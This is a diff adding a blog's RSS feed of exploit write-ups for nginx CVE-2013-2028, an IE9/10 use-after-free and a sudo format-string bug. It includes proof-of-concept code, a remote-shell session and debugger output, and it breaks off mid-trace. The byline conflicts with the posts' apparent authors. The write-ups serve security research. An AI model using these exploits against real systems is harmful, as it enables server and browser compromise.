@@ -1,0 +1,1238 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+    <title>RealJenius.com - Category: research</title>
+   
+   <link>http://realjenius.com</link>
+   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
+   <language>en-us</language>
+   <managingEditor>R.J. Lorimer</managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+  <title>Exploiting nginx chunked overflow bug, the undisclosed attack vector (CVE-2013-2028)</title>
+  <link>http://realjenius.com/research/2013/07/17/exploiting-nginx-chunked-overflow-bug-the-undisclosed-attack-vector-cve-2013-2028.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2013-07-17T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2013/07/17/exploiting-nginx-chunked-overflow-bug-the-undisclosed-attack-vector-cve-2013-2028.html</guid>
+  <description><![CDATA[
+     <p>In <a href="http://www.vnsecurity.net/2013/05/analysis-of-nginx-cve-2013-2028/">previous post</a>, we analyzed and exploited stack based buffer overflow vulnerability in chunked encoding parsing of nginx-1.3.9 – 1.4.0. We mentioned that there was another attack vector which was more practical, more reliable. I talked about this attack vector at <a href="http://www.secuinside.com">SECUINSIDE</a> 2013 in July (btw, a great conference and CTF). Details can be found in <a href="http://ropshell.com/slides/Nginx_chunked_overflow_the_undisclosed_attack_vector.pdf">slides</a>.</p>
+
+<p>In summary:</p>
+
+<ul>
+  <li>Same <a href="http://www.vnsecurity.net/2013/05/analysis-of-nginx-cve-2013-2028/">bug</a> with different code paths that serve dynamic contents via fastcgi, proxy backend, etc. These configurations are more practical in real world environments.</li>
+  <li>Heap based overflow instead of stack based overflow as described in the original advisory. Nothing to worry about stack cookie (so no bruteforcing).</li>
+  <li>The trick to make heap overflow exploit more reliable is via connection spraying.</li>
+  <li>Some small tips and tricks for ROP and shellcode.</li>
+</ul>
+
+<p>Enjoy hacking!</p>
+
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Analysis of nginx 1.3.9/1.4.0 stack buffer overflow and x64 exploitation (CVE-2013-2028)</title>
+  <link>http://realjenius.com/research/2013/05/21/analysis-of-nginx-cve-2013-2028.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2013-05-21T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2013/05/21/analysis-of-nginx-cve-2013-2028.html</guid>
+  <description><![CDATA[
+     <p>A few days after the release of nginx advisory (<a href="http://mailman.nginx.org/pipermail/nginx-announce/2013/000112.html" target="_blank">CVE-2013-2028</a>), we managed to successfully exploit the vulnerability with a full control over the program flow. However, in order to make it more reliable and useful in real world environment, we still explored several program paths and found some other attack vectors. Since the exploit for Nginx 32-bit is available on <a href="https://github.com/rapid7/metasploit-framework/pull/1834" target="_blank">Metasploit</a> now, we decide to publish some of our works here. In this post, you will find a quick analysis for the vulnerability and an exploitation for a 64-bit linux server using the stack based overflow attack vector.</p>
+
+<h3 id="the-bug">The Bug</h3>
+
+<p>Based on <a href="http://nginx.org/download/patch.2013.chunked.txt" target="_blank">the patch</a> on nginx.org, there is a code path that leads to a stack based overflow vulnerability, related to 03 different nginx components:</p>
+
+<p><strong>1) The calculation of “chunked size”</strong> when someone send a http request with the header: “Transfer-Encoding: chunked”. It is calculated at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_parse.c#L2011" target="_blank">src/http/ngx_http_parse.c:2011</a></p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">if (ch &gt;= '0' &amp;&amp; ch &lt;= '9') {   ctx-&gt;size = ctx-&gt;size * 16 + (ch - '0');
+  break;
+}
+c = (u_char) (ch | 0x20);
+if (c &gt;= 'a' &amp;&amp; c &lt;= 'f') {   ctx-&gt;size = ctx-&gt;size * 16 + (c - 'a' + 10);
+  break;
+}
+</pre>
+
+<p>It simply parses the chunked size input as hex and convert it to base of 10. And since ctx-&gt;size is defined with size_t, an unsigned type, the value of the variable can be misinterpreted as negative number when casting to signed type, as we will see later.</p>
+
+<p><strong>2) Nginx module when serving static file:</strong></p>
+
+<p>When nginx is setup to serve static file (which is the default setting), ngx_http_static_handler in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/modules/ngx_http_static_module.c#L49" target="_blank">src/http/modules/ngx_http_static_module.c:49</a> will be executed when receiving a request.</p>
+
+<p>ngx_http_static_handler will then call ngx_http_discard_request_body at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/modules/ngx_http_static_module.c#L211" target="_blank">src/http/modules/ngx_http_static_module.c:211</a>.</p>
+
+<p>ngx_http_discard_request_body will then call ngx_http_read_discarded_request_body at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L526" target="_blank">src/http/ngx_http_request_body.c:526</a>.</p>
+
+<p><em>In summary the code path: ngx_http_static_handler-&gt;ngx_http_discard_request_body-&gt;ngx_http_read_discarded_request_body</em></p>
+
+<p>ngx_http_read_discarded_request_body is where it gets interesting, we can see a buffer with fixed size is defined at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L630" target="_blank">src/http/ngx_http_request_body.c:630</a> as follows:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">static ngx_int_t
+ngx_http_read_discarded_request_body(ngx_http_request_t *r)
+{
+    size_t     size;
+    ssize_t    n;
+    ngx_int_t  rc;
+    ngx_buf_t  b;
+    u_char     buffer[NGX_HTTP_DISCARD_BUFFER_SIZE];
+</pre>
+
+<p>NGX_HTTP_DISCARD_BUFFER_SIZE is defined as 4096 in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request.h#L19" target="_blank">src/http/ngx_http_request.h:19 </a></p>
+
+<p>The interesting is at how this buffer is filled at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L649" target="_blank">src/http/ngx_http_request_body.c:649</a> that we shall use later in (3)</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">size = (size_t) ngx_min(r-&gt;headers_in.content_length_n, NGX_HTTP_DISCARD_BUFFER_SIZE);
+n = r-&gt;connection-&gt;recv(r-&gt;connection, buffer, size);
+</pre>
+
+<p><strong>3) The state transition when parsing http request</strong></p>
+
+<p>Come back to <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c" target="_blank">src/http/ngx_http_request_body.c</a>, before calling ngx_http_read_discarded_request_body, nginx <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L514" target="_blank">check whether we have a “chunked” type of request</a>, it will then run ngx_http_discard_request_body_filter defined in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L680" target="_blank">src/http/ngx_http_request_body.c:680</a>.</p>
+
+<p>ngx_http_discard_request_body_filter will execute <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L707" target="_blank">ngx_http_parse_chunked</a> which is the code we mentioned in (1). After that, the return value in “rc” is checked with some constant to decide the next move. One of them is particularly very interesting.</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">if (rc == NGX_AGAIN) {
+     /* set amount of data we want to see next time */
+     r-&gt;headers_in.content_length_n = rb-&gt;chunked-&gt;length;
+     break;
+}
+</pre>
+
+<p>**Suppose we can set rb-&gt;chunked-&gt;length as a very large number at (1), and then set rc = NGX_AGAIN at (3), following events will happen:<br />
+**</p>
+
+<ul>
+  <li>
+    <p>r-&gt;headers_in.content_length_n is set to negative ( as it is defined with `off_t` which is <a href="http://www.gnu.org/software/libc/manual/html_mono/libc.html" target="_blank">“a signed integer”</a> type.).</p>
+  </li>
+  <li>
+    <p>The function ngx_http_discard_request_body_filter return and the program move to execute <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L526" target="_blank">ngx_http_read_discarded_request_body</a>. which contains our vulnerable buffer.</p>
+  </li>
+  <li>
+    <p>Finally the recv() command is tricked to receive more than 4096 bytes and overflow the buffer on the stack.</p>
+  </li>
+</ul>
+
+<p>There are many ways to set chunked-&gt;length, since rb-&gt;chunked-&gt;length is assigned at the end of ngx_http_parse_chunked function based on the rb-&gt;chunked-&gt;size that we have a direct control.</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">switch (state) {
+case sw_chunk_start:
+	ctx-&gt;length = 3 /* "0" LF LF */;
+break;
+	case sw_chunk_size:
+ctx-&gt;length = 2 /* LF LF */
+              + (ctx-&gt;size ? ctx-&gt;size + 4 /* LF "0" LF LF */ : 0);
+</pre>
+
+<p>To make rc = NGX_AGAIN, we realize that for a request nginx makes the first recv with 1024 bytes, so if we send more than 1024 bytes ngx_http_parse_chunked will return with a NGX_AGAIN then when nginx tries to recv again it will be right into our setup.</p>
+
+<p>**The payload to overflow the stack buffer is as follows: **</p>
+
+<ul>
+  <li>
+    <p>Send http request with a “transfer-encoding: chunked”</p>
+  </li>
+  <li>
+    <p>Send a large hexadecimal number to fill the entire 1024 bytes of the first read</p>
+  </li>
+  <li>
+    <p>Send &gt; 4096 bytes to overflow the buffer when it try to recv the second times</p>
+  </li>
+</ul>
+
+<p><strong>TL;DR ?</strong> Here is the proof of concept for x64</p>
+
+<pre class="brush: ruby; title: ; notranslate" title="">require 'ronin'
+tcp_connect(ARGV[0],ARGV[1].to_i) { |s|
+    payload = ["GET / HTTP/1.1rn",
+            "Host: 1337.vnsecurity.netrn",
+            "Accept: */*rn",
+            "Transfer-Encoding: chunkedrnrn"].join
+    payload &lt;&lt; "f"*(1024-payload.length-8) + "0f0f0f0f" #chunked
+    payload &lt;&lt; "A"*(4096+8) #padding
+    payload &lt;&lt; "C"*8 #cookie
+    s.send(payload, 0)
+}
+</pre>
+
+<p>strace output at the other end:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">strace -p 11337 -s 5000 2&gt;&amp;1 | grep recv
+recvfrom(3, "GET / HTTP/1.1rnHost: 1337.vnsecurity.netrnAccept: */*rnTransfer-Encoding: chunkedrnrnfff...snip..fff0f0f0f0f", 1024, 0, NULL, NULL) = 1024
+recvfrom(3, "AAA..snip..AACCCCCCCC", 18446744069667229461, 0, NULL, NULL) = 4112
+</pre>
+
+<h3 id="exploitation-on-x64">Exploitation on x64:</h3>
+
+<p>The problem of stack cookie/carnary can be overcome easily by brute-forcing byte by byte. If we send an extra byte and a worker process crashes, it will return nothing thus we know our cookie value is wrong, we try another value until we receive some output.</p>
+
+<p>Then we need to bypass ASLR and DEP. The exploitation for 32-bit in the metasploit module won’t work, since it will bruteforce the libc address and it’s not feasible given the large address space in x64.</p>
+
+<p>We give an exploit that only relies on the binary i.e. we build the ROP gadget from the binary. mprotect address is computed from mmap64 address (in the GOT-table) then use to allocate a writable-executable memory chunked. Then we use some ROP gadgets to copy our shellcode and have it executed by return to it finally.</p>
+
+<p>TL;DR full exploit code could be find <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/exp-nginx.rb" target="_blank">here</a></p>
+
+<pre class="brush: plain; title: ; notranslate" title="">ruby exp-nginx.rb 1.2.3.4 4321
+[+] searching for byte: 1
+214
+[+] searching for byte: 2
+102
+[+] searching for byte: 3
+232
+[+] searching for byte: 4
+213
+[+] searching for byte: 5
+103
+[+] searching for byte: 6
+151
+[+] searching for byte: 7
+45
+Found cookie: x00xd6x66xe8xd5x67x97x2d 8
+PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT w.w.w.w 4000
+1120 connections
+</pre>
+
+<p><em>At w.w.w.w</em></p>
+
+<pre class="brush: plain; title: ; notranslate" title="">nc -lvvv 4000
+Connection from 1.2.3.4 port 4000 [tcp/*] accepted
+uname -a
+Linux ip-10-80-253-191 3.2.0-40-virtual #64-Ubuntu SMP Mon Mar 25 21:42:18 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
+id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),111(admin)
+ps aux | grep nginx
+ubuntu    2920  0.1  0.0  13920   668 ?        Ss   15:11   0:01 nginx: master process ./sbin/nginx
+ubuntu    5037  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
+ubuntu    5039  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
+ubuntu    5041  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
+</pre>
+
+<h3 id="reliable-exploitation">Reliable exploitation</h3>
+
+<p>There are some reasons that the above exploitation/technique may not work in practice:</p>
+
+<p>1) Nginx uses non-blocking recv(). If we can’t send enough data to overwrite the return address/cookie the exploit will fail. This is mostly the case since the normal server will be loaded with requests from different user.</p>
+
+<p>2) Our analysis here is for the default setting of nginx, the code path can be very different with another setting thus making the exploit somewhat useless.</p>
+
+<p>3) A blind attack is difficult without the knowledge of the binary / OS at the remote server. For 32-bit OS, one may further bruteforce the “write” address in the code space in order to leak information but It will still be unreliable due to the unknown sockfd and will fail for PIE.</p>
+
+<p>Trying to make this more practical in real world environments, we actually found another attack vector which is more reliable and worked on several nginx settings. However, we will keep it for another post.</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>CMarkup Use After Free Vulnerability &#8211; CVE-2012-4782</title>
+  <link>http://realjenius.com/research/2013/01/10/cmarkup-use-after-free-vulnerability-cve-2012-4782.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2013-01-10T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2013/01/10/cmarkup-use-after-free-vulnerability-cve-2012-4782.html</guid>
+  <description><![CDATA[
+     <p>Latest M$ tuesday patch kill one of my 0day in Microsoft Internet Explorer 9/10. So I decided release Proof Of Concept code and writeup some analyze about this bug. Hope it helpful.</p>
+
+<p>Here is the PoC:</p>
+
+<pre class="brush: xml; title: ; notranslate" title="">&lt;!doctype html&gt;
+&lt;html&gt;
+        &lt;head&gt;
+                &lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" /&gt;
+               &lt;script&gt;
+                       function testcase(){
+                                document.body.appendChild(document.createElement('progress'));
+                                document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
+                                document.body.appendChild(document.createElement('progress'));
+                                document.body.appendChild(document.createElement('table'));
+                                document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
+                            document.getElementsByTagName('progress').item(0).appendChild(document.createElement('frameset'));
+                                document.getElementsByTagName('track').item(0).offsetWidth;
+
+                                document.getElementsByTagName('progress').item(1).appendChild(document.getElementsByTagName('track').item(0));
+                                document.body.appendChild(document.createElement("&lt;ins style='margin-left:2222222222px'&gt;&lt;/ins&gt;"));
+
+                &lt;/script&gt;
+        &lt;/head&gt;
+        &lt;body onload='testcase();'&gt;
+
+        &lt;/body&gt;
+&lt;/html&gt;
+</pre>
+
+<p>After running this html we’ve got a nice crash:<br />
+<code>(fcc.354): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
+eax=0b7befc0 ebx=088cd6b8 ecx=0b6b2fa8 edx=00000006 esi=0b6b2fa8 edi=00000000&lt;br /&gt;
+eip=639927e9 esp=088cd1c8 ebp=088cd1d0 iopl=0         nv up ei pl nz na po nc&lt;br /&gt;
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202&lt;br /&gt;
+MSHTML!CTreeNode::GetFancyFormat+0xc:&lt;br /&gt;
+639927e9 0fb74640        movzx   eax,word ptr [esi+40h]   ds:0023:0b6b2fe8=0000&lt;br /&gt;
+0:017&gt; u&lt;br /&gt;
+MSHTML!CTreeNode::GetFancyFormat+0xc:&lt;br /&gt;
+639927e9 0fb74640        movzx   eax,word ptr [esi+40h]&lt;br /&gt;
+639927ed 6685c0          test    ax,ax&lt;br /&gt;
+</code></p>
+
+<p>Now using my binary instrumentation framework (a PIN based instrumentation which could do things like: crash analyze, taint tracing, code coverage..), I could get the following output</p>
+
+<p><code>&lt;br /&gt;
+Exception Point: 639927e9 0fb74640        movzx   eax,word ptr [esi+40h]&lt;br /&gt;
+Current Register:&lt;br /&gt;
+eax:0b7befc0&lt;br /&gt;
+esi:0b6b2fa8&lt;br /&gt;
+Backtrace analyze:&lt;br /&gt;
+[+]639927e7 -&gt; esi: 0b6b2fa8 | ecx: 0b6b2fa8&lt;br /&gt;
+[+]639927e5 -&gt; ecx: 0b6b2fa8&lt;br /&gt;
+[+]636c1d2d -&gt; ecx:0b6b2fa8&lt;br /&gt;
+[+]639ae295 -&gt; esi: 0b6b2fa8&lt;br /&gt;
+===================&lt;br /&gt;
+Detect Freed Address: 0b6b2fa8 at EIP 639AE299&lt;br /&gt;
+With param: HeapFree(150000,23,0b6b2fa8)&lt;br /&gt;
+</code></p>
+
+<p>So it is a pretty nice Used After Free vulnerability. But what is freed?</p>
+
+<p>Run the tool again, this time to collect information about Heap Allocate, I can see:<br />
+<code>&lt;br /&gt;
+.....&lt;br /&gt;
+Detect Heap Allocate : 638f13dc&lt;br /&gt;
+With Param: HeapAlloc(150000, 8u, 0x54)&lt;br /&gt;
+Return value: 0b6b2fa8</code></p>
+
+<p>And it occur in function:<br />
+<code>CMarkup::InsertElementInternal</code><br />
+So now we can use a little trick to manipulate freed address:</p>
+
+<pre class="brush: xml; title: ; notranslate" title="">&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" /&gt;
+
+		&lt;script&gt;
+
+                function testcase(){
+
+				var img = new Array();
+				  for(var i = 0;i &lt; 100;i++){
+				  	img[i] = document.createElement('img');
+				  	img[i]["src"] = "a";
+				  }
+				document.body.appendChild(document.createElement('progress'));
+				document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
+				document.body.appendChild(document.createElement('progress'));
+				document.body.appendChild(document.createElement('table'));
+				document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
+			    document.getElementsByTagName('progress').item(0).appendChild(document.createElement('frameset'));
+				document.getElementsByTagName('track').item(0).offsetWidth;
+
+				document.getElementsByTagName('progress').item(1).appendChild(document.getElementsByTagName('track').item(0));
+				document.body.appendChild(document.createElement("&lt;ins style='margin-left:2222222222px'&gt;&lt;/ins&gt;"));
+
+				window.scroll(500);
+
+				for(var j = 0;j &lt; 99;j++){
+				 	img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";}
+
+				 }
+
+		&lt;/script&gt;
+	&lt;/head&gt;
+	&lt;body onload='testcase();'&gt;
+
+	&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+
+<p>And we’ve got:<br />
+<code>&lt;br /&gt;
+(c10.d88): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
+eax=00000041 ebx=088cd6b8 ecx=00410041 edx=ff000000 esi=0c53efa8 edi=00000000&lt;br /&gt;
+eip=639927ff esp=088cd1c8 ebp=088cd1d0 iopl=0         nv up ei pl nz na pe nc&lt;br /&gt;
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206&lt;br /&gt;
+MSHTML!CTreeNode::GetFancyFormat+0x1e:&lt;br /&gt;
+639927ff 8b4a2c          mov     ecx,dword ptr [edx+2Ch] ds:0023:ff00002c=????????&lt;br /&gt;
+0:017&gt; dd esi&lt;br /&gt;
+0c53efa8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53efb8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53efc8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53efd8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53efe8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53eff8  00410041 d0d00000 ???????? ????????&lt;br /&gt;
+0c53f008  ???????? ???????? ???????? ????????&lt;br /&gt;
+0c53f018  ???????? ???????? ???????? ????????&lt;br /&gt;
+0:017&gt; dd 410041&lt;br /&gt;
+00410041  b341be78 7274f8ac 18ea3e88 3c00005c&lt;br /&gt;
+00410051  ff000000 4dffffff cbb7a93b b0487827&lt;br /&gt;
+00410061  ebd03627 48a7a85f 3d00005c ff000000&lt;br /&gt;
+00410071  98ffffff 9b1b1704 a14da1bb 315fec5b&lt;br /&gt;
+00410081  74f7c784 3e00005c ff000000 f0ffffff&lt;br /&gt;
+00410091  0d343fb3 ae43076f 1b2599a9 a86d9aad&lt;br /&gt;
+004100a1  3f00005c ff000000 93ffffff ddca1f10&lt;br /&gt;
+004100b1  844c01b0 ebee76ab dc391fca 4000005c&lt;br /&gt;
+0:017&gt; u&lt;br /&gt;
+</code><br />
+Why it crashing here:<br />
+<code>&lt;br /&gt;
+.text:639927E9                 movzx   eax, word ptr [esi+40h]&lt;br /&gt;
+.text:639927ED                 test    ax, ax&lt;br /&gt;
+.text:639927F0                 js      loc_63842DAE&lt;br /&gt;
+.text:639927F6                 mov     ecx, [esi+50h]&lt;br /&gt;
+.text:639927F9                 mov     edx, [ecx+80h]&lt;br /&gt;
+.text:639927FF                 mov     ecx, [edx+2Ch]</code><br />
+Since we can control esi, we can force program to jump 63842DAE by changing some bytes in img.src:<br />
+<code>&lt;br /&gt;
+..&lt;br /&gt;
+img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAu8141u4141AAAAAAAA";}&lt;br /&gt;
+....&lt;br /&gt;
+</code></p>
+
+<p><code>&lt;br /&gt;
+(614.fd4): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
+eax=00000000 ebx=00000000 ecx=00410041 edx=b341be78 esi=088ccc00 edi=0c540fa8&lt;br /&gt;
+eip=6383a61a esp=088ccbe0 ebp=088ccbf0 iopl=0         nv up ei pl zr na pe nc&lt;br /&gt;
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246&lt;br /&gt;
+MSHTML!CTreeNode::ComputeFormats+0xa1:&lt;br /&gt;
+6383a61a 8b82c4000000    mov     eax,dword ptr [edx+0C4h] ds:0023:b341bf3c=????????&lt;br /&gt;
+0:017&gt; dd edi&lt;br /&gt;
+0c540fa8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c540fb8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c540fc8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c540fd8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c540fe8  41418141 00410041 00410041 00410041&lt;br /&gt;
+0c540ff8  00410041 d0d00000 ???????? ????????&lt;br /&gt;
+0c541008  ???????? ???????? ???????? ????????&lt;br /&gt;
+0c541018  ???????? ???????? ???????? ????????&lt;br /&gt;
+0:017&gt; dd ecx&lt;br /&gt;
+00410041  b341be78 7274f8ac 18ea3e88 3c00005c&lt;br /&gt;
+00410051  ff000000 4dffffff cbb7a93b b0487827&lt;br /&gt;
+00410061  ebd03627 48a7a85f 3d00005c ff000000&lt;br /&gt;
+00410071  98ffffff 9b1b1704 a14da1bb 315fec5b&lt;br /&gt;
+00410081  74f7c784 3e00005c ff000000 f0ffffff&lt;br /&gt;
+00410091  0d343fb3 ae43076f 1b2599a9 a86d9aad&lt;br /&gt;
+004100a1  3f00005c ff000000 93ffffff ddca1f10&lt;br /&gt;
+004100b1  844c01b0 ebee76ab dc391fca 4000005c&lt;br /&gt;
+</code></p>
+
+<p>And we change edi:<br />
+<code>&lt;br /&gt;
+img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAu5555u5555AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAu8141u4141AAAAAAAA";}&lt;br /&gt;
+</code></p>
+
+<p>And Boom:<br />
+<code>&lt;br /&gt;
+eax=00000000 ebx=00000000 ecx=55555555 edx=640386e0 esi=088ccc00 edi=0c678fa8&lt;br /&gt;
+eip=6383a618 esp=088ccbe0 ebp=088ccbf0 iopl=0         nv up ei pl zr na pe nc&lt;br /&gt;
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246&lt;br /&gt;
+MSHTML!CTreeNode::ComputeFormats+0x9f:&lt;br /&gt;
+6383a618 8b11            mov     edx,dword ptr [ecx]  ds:0023:55555555=????????&lt;br /&gt;
+0:017&gt; u&lt;br /&gt;
+MSHTML!CTreeNode::ComputeFormats+0x9f:&lt;br /&gt;
+6383a618 8b11            mov     edx,dword ptr [ecx]&lt;br /&gt;
+6383a61a 8b82c4000000    mov     eax,dword ptr [edx+0C4h]&lt;br /&gt;
+6383a620 ffd0            call    eax&lt;br /&gt;
+6383a622 8b400c          mov     eax,dword ptr [eax+0Ch]&lt;br /&gt;
+6383a625 57              push    edi&lt;br /&gt;
+6383a626 893e            mov     dword ptr [esi],edi&lt;br /&gt;
+6383a628 894604          mov     dword ptr [esi+4],eax&lt;br /&gt;
+6383a62b 8b0f            mov     ecx,dword ptr [edi]</code></p>
+
+<p>Good luck pwner :p</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Exploiting Sudo format string vunerability</title>
+  <link>http://realjenius.com/research/2012/02/16/exploiting-sudo-format-string-vunerability.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2012-02-16T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2012/02/16/exploiting-sudo-format-string-vunerability.html</guid>
+  <description><![CDATA[
+     <p>In this post we will show how to exploit format string vulnerability in sudo 1.8 that reliably bypasses FORTIFY_SOURCE, ASLR, NX and Full RELRO protections. Our test environment is Fedora 16 which is shipped with a vulnerable sudo version (sudo-1.8.2p1).</p>
+
+<h2 id="the-vulnerability">The vulnerability</h2>
+
+<p>Vulnerability detail can be found in <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0809" target="_blank">CVE-2012-0809</a>. In summary, executing sudo in debug mode with crafted argv[0] will trigger the format string bug. E.g:</p>
+
+<pre>$ ln -s /usr/bin/sudo ./%n
+$ ./%n -D9</pre>
+
+<h2 id="the-exploit">The exploit</h2>
+
+<p>Though above format string vulnerability is straight, it is not easy to exploit on modern Linux distributions. sudo binary in Fedora 16 comes with:</p>
+
+<ul>
+  <li><a href="http://fedoraproject.org/wiki/Security/Features#Compile_Time_Buffer_Checks_.28FORTIFY_SOURCE.29" target="_blank">FORTIFY_SOURCE</a></li>
+  <li>Full <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank">ASLR</a> (including <a href="http://en.wikipedia.org/wiki/Position-independent_code#Position-independent_executables">PIE</a>)</li>
+  <li>Full <a href="http://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank">RELRO</a></li>
+  <li><a href="http://en.wikipedia.org/wiki/Executable_space_protection" target="_blank">NX</a> (DEP)</li>
+</ul>
+
+<p>In order to exploit format string bug we have to bypass all above protections, but thanks to this local bug, we can disable ASLR easily with resources limit trick (another notes, prelink is enabled on Fedora 16 so it also disable ASLR from local exploits). As a consequence, NX can be defeated with return-to-libc/ROP with known addresses. The most difficult part is bypassing FORTIFY_SOURCE.</p>
+
+<h3 id="bypassing-fortifysource">Bypassing FORTIFY_SOURCE</h3>
+
+<p>We just follow <a href="http://www.phrack.org/issues.html?issue=67&amp;id=9&amp;mode=txt" target="_blank">“A Eulogy for Format Strings”</a> article from Phrack #67 by Captain Planet wit very detail steps to bypass FORTIFY_SOURCE. In summary, there is an integer overflow bug in FORTIFY_SOURCE patch, by exploiting this we can turn off <span style="line-height: normal">_IO_FLAGS2_FORTIFY bit in file stream and use “%n” operation from a writable address. Following steps will be done:</span><span style="line-height: normal"> </span></p>
+
+<ol>
+  <li>Set nargs to a big value so (nargs * 4) will be truncated to a small integer value, the perfect value is nargs = 0×40000000, so nargs * 4 = 0. The format string to achieve this looks like: “%*1073741824$”</li>
+  <li><span style="line-height: normal">Turn off </span>_IO_FLAGS2_FORTIFY on stderr file stream</li>
+  <li>Reset nargs = 0 to bypass check loop</li>
+</ol>
+
+<p>Let examine #2 and #3 in detail. We create a wrapper (sudo-exploit.py) then fire a GDB session:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python
+import os
+import sys
+
+def exploit(vuln):
+    fmtstring = "%*123$ %*456$ %1073741824$"
+    args = [fmtstring, "-D9"]
+    env = os.environ
+    os.execve(vuln, args, env)
+
+if __name__ == "__main__":
+    if len(sys.argv) &lt; 2:
+        usage()
+    else:
+        exploit(sys.argv[1])
+</pre>
+
+<pre class="brush: plain; title: ; notranslate" title=""># ulimit -s unlimited
+# gdb -q /usr/bin/sudo
+Reading symbols from /usr/bin/sudo...Reading symbols from /usr/lib/debug/usr/bin/sudo.debug...done.
+done.
+gdb$ set exec-wrapper ./sudo-exploit.py
+gdb$ run
+process 2149 is executing new program: /usr/bin/sudo
+*** invalid %N$ use detected ***
+
+Program received signal SIGABRT, Aborted.
+gdb$ bt
+#0  0x40038416 in ?? ()
+#1  0x400bc98f in __GI_raise (sig=0x6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:64
+#2  0x400be2d5 in __GI_abort () at abort.c:91
+#3  0x400fbe3a in __libc_message (do_abort=0x1, fmt=0x401f3dea "%s") at ../sysdeps/unix/sysv/linux/libc_fatal.c:198
+#4  0x400fbf64 in __GI___libc_fatal (message=0x401f5a6c "*** invalid %N$ use detected ***n") at ../sysdeps/unix/sysv/linux/libc_fatal.c:209
+#5  0x400d1df5 in _IO_vfprintf_internal (s=0xbff42498, format=&lt;optimized out&gt;, ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf.c:1771
